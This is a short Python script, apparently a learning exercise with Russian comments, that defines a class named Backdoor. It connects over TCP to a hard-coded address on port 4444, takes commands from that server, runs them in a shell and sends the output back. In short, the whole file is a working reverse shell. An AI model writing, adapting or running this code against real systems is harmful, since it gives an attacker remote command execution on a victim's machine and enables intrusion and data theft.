#!/usr/bin/env python

'''Клиент Сокет (англ. socket — разъём)'''
import socket
import subprocess



class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Создаем сокет специальыми константами IPv4 и TCP
		self.connection.connect((ip, port)) #Отправляем запрос на установку соединение с сервером, указывая IP адрес и порт

	def execute_system_command(self, command):
		return subprocess.check_output(command.decode(), shell=True)

	def run(self):
		while True:
			command = self.connection.recv(4096) #Принимаем от сервера данные
			command_result = self.execute_system_command(command)
			self.connection.send(command_result) #Отправляем данные к серверу
		connection.close()


my_backdoor = Backdoor('192.168.0.104', 4444)
my_backdoor.run()